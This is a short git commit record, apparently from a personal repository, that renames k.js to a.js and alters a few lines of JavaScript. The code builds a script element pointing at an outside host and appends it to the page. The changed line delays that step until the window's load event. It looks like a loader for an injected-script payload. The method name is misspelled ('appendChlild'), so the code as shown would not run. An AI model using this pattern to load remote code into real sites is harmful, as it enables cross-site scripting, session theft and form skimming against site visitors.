01c74544bd62a9e63a1dcc5349c7eda3593d154e
Becojo <Becojo@users.noreply.github.com>
2023-12-20 20:30:11 -0500

    Update and rename k.js to a.js

--- a.js
+++ a.js
@@ -1,3 +1,3 @@
 var s = document.createElement('script');
 s.src = 'https://mbp.golden-bull.ts.net/k.js';
-document.body.appendChlild(s);
+window.addEventListener('load', () => document.body.appendChlild(s));
